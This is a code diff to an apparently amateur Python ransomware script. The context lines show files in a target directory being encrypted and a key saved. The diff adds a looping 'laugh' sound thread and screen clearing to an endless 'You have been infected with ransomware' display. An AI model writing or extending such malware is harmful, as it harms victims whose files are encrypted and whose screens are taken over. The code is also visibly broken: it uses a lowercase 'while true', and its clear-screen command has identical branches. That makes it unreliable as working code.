@@ -112,6 +112,19 @@ for filename in listdir(TARGET_DIR):
 print("Encryption completed! Key saved to encryption.key")
 import colorama
 from time import sleep
+import pygame
+from playsound import playsound
+import threading
+
+def play_music():
+    while True:
+        playsound("laugh")
+
+
+thread = threading.Thread(target=play_music, daemon=True)
+thread.start()
+import os
+
 while true:    
     print(Back.WHITE+"""
     
@@ -155,6 +168,7 @@ while true:
     
     
     """)
+    os.system("clear"if os.name=="nt" else "clear")
     print(Back.WHITE+"You have been infected with ransomware. Get well soon.")
     sleep(0.1)
     print(Back.BLACK+"""
@@ -200,4 +214,5 @@ while true:
     
     """)
     print(Back.WHITE+"You have been infected with ransomware. Get well soon.")
+    os.system("clear"if os.name=="nt" else "clear")
     sleep(0.1)
